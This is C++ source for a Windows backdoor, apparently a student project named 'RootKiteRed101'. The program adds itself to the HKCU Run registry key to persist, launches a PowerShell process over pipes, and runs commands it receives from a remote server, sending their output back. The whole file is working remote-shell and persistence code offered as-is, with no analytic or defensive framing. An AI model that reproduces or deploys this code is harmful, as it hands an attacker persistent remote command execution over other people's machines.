
#include "clinte.h"
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#include <windows.h> 
#include <iostream>
#include <tchar.h>
#include <stdio.h> 
#include <string>

#define MIN(a,b) ((a) < (b)?(a):(b))


// create all the handles and all the 
HANDLE OutputPipeReadEnd = NULL;
HANDLE OutputPipeWriteEnd = NULL;
HANDLE InputPipeReadEnd = NULL;
HANDLE InputPipeWriteEnd = NULL;

STARTUPINFO si;
PROCESS_INFORMATION pi;

using namespace std;

// signture of the funactions 
boolean CreatePipesForInProcess();
boolean WriteToPoweShell(string Commend, DWORD* NumberOfBytesWritten);
boolean CreatePowerShell();
boolean ReadOutputPowershell();
void IsInReg();
void AddToReg();
void ClosingPorgram();




void ClosingPorgram() {

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	// closing the pipes to really close the porcess
	CloseHandle(InputPipeReadEnd);
	CloseHandle(OutputPipeWriteEnd);
	cout << "closed proc" << endl;
}

boolean CreatePowerShell() {

	wstring processName = L"powershell.exe";
	//wcout << L"Enter the name of the process to run: ";
	//getline(wcin, processName);
	wstring Dircoty = L"C:\\Users\\ronen\\Documents\\school";

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError = OutputPipeWriteEnd;
	si.hStdOutput = OutputPipeWriteEnd;
	si.hStdInput = InputPipeReadEnd;
	si.dwFlags |= STARTF_USESTDHANDLES;

	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		const_cast<LPWSTR>(processName.c_str()),        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		TRUE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory  const_cast<LPWSTR>(Dircoty.c_str()) 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return false;
	}
	return true;
}

boolean CreatePipesForInProcess() {
	SECURITY_ATTRIBUTES sa;
	// make the child to get the pipes too i mean inheretnce wwowo
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	// pip A --> child read parnt write
	if (!CreatePipe(&OutputPipeReadEnd, &OutputPipeWriteEnd, &sa, 0)) {
		cout << "pip A isnt working" << endl;
		return false;
	}
	//pip B --> child write parant read
	if (!CreatePipe(&InputPipeReadEnd, &InputPipeWriteEnd, &sa, 0)) {
		cout << "pip B isnt working idk why my man" << endl;
		return false;
	}
	return true;

}

boolean ReadOutputPowershell() {
	char buffer[4096] = { 0 };
	DWORD bytesRead = 0;
	//char output[4096] = { 0 };
	//size_t outputLength = 0;
	DWORD Avlible_bytes = 0;

	Sleep(300);
	while ((PeekNamedPipe(OutputPipeReadEnd, NULL, 0, NULL, &Avlible_bytes, NULL)) && Avlible_bytes > 0) {
		while (Avlible_bytes != 0) {
			if (!ReadFile(OutputPipeReadEnd, buffer, MIN(sizeof(buffer) - 1, Avlible_bytes), &bytesRead, NULL)) {
				cout << "read file isnt working" << endl;
				return false;
			}
			buffer[bytesRead] = '\0';
			cout << buffer;
			sendMessage(buffer);
			Avlible_bytes = Avlible_bytes - bytesRead;
		}
		Sleep(300);
	}
	if (Avlible_bytes == 0) {
		//cout << "end reading output succsefully" << endl;
		return true;
	}
	cout << "end output not really succsefully" << endl;
	return false;
}

boolean WriteToPoweShell(string Commend, DWORD* NumberOfBytesWritten) {
	bool isSucces = false;

	Commend += "\n";
	isSucces = WriteFile(

		InputPipeWriteEnd,     // use pipe A

		Commend.c_str(),

		strlen(Commend.c_str()),

		NumberOfBytesWritten,

		NULL
	);
	if (!isSucces) {
		cout << "shit bro this isnt working we are fucked" + GetLastError() << endl;
		return false;
	}
	return true;
}

void AddToReg() {
	HKEY hKey;
	LPCWSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LPCWSTR lpValueName = L"proc";
	LPCWSTR lpValue = L"E:\\Cyber\\RootKiteRed101\\Project1\\x64\\Release\\Project1.exe";

	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey);
	if (result != ERROR_SUCCESS) {
		cout << "Faild to save to add the regkey Error code: " << result << endl;
		return;
	}
	
	result = RegSetValueEx(hKey, lpValueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(lpValue), (wcslen(lpValue) + 1) * sizeof(WCHAR));
	if (result != ERROR_SUCCESS) {
		std::cout << "Failed to set registry value. Error code: " << result << std::endl;
		RegCloseKey(hKey);
		return;
	}

	std::cout << "Registry key added successfully." << std::endl;

	// Close the registry key
	RegCloseKey(hKey);

	return;
}

void IsInReg() {
	HKEY hKey;
	LPCWSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LPCWSTR lpValueName = L"proc"; 

	// Open the registry key
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey);
	if (result != ERROR_SUCCESS) {
		std::cout << "Failed to open registry key. Error code: " << result << std::endl;
		return;
	}

	// Check if the value name exists in the registry
	DWORD dwType;
	BYTE data[512];
	DWORD cbData = sizeof(data);
	result = RegQueryValueEx(hKey, lpValueName, NULL, &dwType, data, &cbData);
	if (result == ERROR_SUCCESS) {
		std::cout << "Registry entry already exists." << std::endl;
		RegCloseKey(hKey);
		return;
	}

	// Close the registry key
	RegCloseKey(hKey);
	AddToReg();
	return;
}








void _tmain(int argc, TCHAR* argv[])
{

	// adds to reg 
	IsInReg();

	//setup info
	DWORD NumberOfBytesWritten;
	ZeroMemory(&NumberOfBytesWritten, sizeof(DWORD));
	//end of setup info


	//create the pipes
	if (!CreatePipesForInProcess()) {
		cout << "faild to creat pipes" + GetLastError() << endl;
		return;
	}
	else
	{
		cout << "pipes are working" << endl;
	}
	// end creation of pies


	//creating the child process
	if (!CreatePowerShell()) {
		cout << "creating powershell isnt workign" << endl;
		return;
	}
	//end of the child process creation


	//loop for I/O
	string UserInput;
	if (!ReadOutputPowershell()) {
		cout << "reading output problem" << endl;
		ClosingPorgram();
	}
	for (;;) {
		string UserInput = receiveMessages();

		if (UserInput == "exit!") {
			cout << "beyyyyyy my man" << endl;
			ClosingPorgram();
		}
		//if (UserInput.substr(0, 9) == "download ") {
		//	std::string filePath = UserInput.substr(9);
		//	downloadFile(server, port, "/", filePath);
		//}

		cout << "sending to the powershell " + UserInput << endl;
		if (!WriteToPoweShell(UserInput, &NumberOfBytesWritten)) {
			cout << "problem sending" + GetLastError() << endl;
			ClosingPorgram();
		}
		if (!ReadOutputPowershell()) {
			cout << "reading isnt workign" << endl;
			ClosingPorgram();
		}
	}
	cout << "out loop" << endl;
	ClosingPorgram();

	////closing precudersces

	//// Wait until child process exits.
	//WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);

	//// closing the pipes to really close the porcess
	//CloseHandle(InputPipeReadEnd);
	//CloseHandle(OutputPipeWriteEnd);
}


